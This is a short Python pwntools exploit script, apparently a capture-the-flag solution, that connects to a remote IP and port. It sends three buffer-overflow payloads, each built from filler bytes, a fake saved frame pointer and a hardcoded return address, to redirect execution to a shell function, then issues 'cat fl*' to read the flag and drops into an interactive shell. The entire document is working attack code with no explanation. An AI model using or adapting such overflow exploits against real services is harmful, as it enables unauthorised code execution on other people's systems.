from pwn import *
h,p = '111.200.241.244',49811
p = remote(h,p)
#p = process("./004")
#elf = ELF("./004")
#context.log_level = "debug"
easy = "A"*0x200
normal = "B"*0x180
shell = "C"*0x100
rbp = "D"*8
p.recvuntil("The switch is:")
easy_addr = 0x4006b0
print easy_addr
exp = easy+rbp+p64(easy_addr)
print exp
p.sendline(exp)
normal_addr = 0x400607
exp = normal+rbp+p64(normal_addr)
p.sendline(exp)
shell_addr = 0x4005f6
exp = shell + rbp + p64(shell_addr)
p.sendline(exp)
p.sendline("cat fl*")
p.interactive()

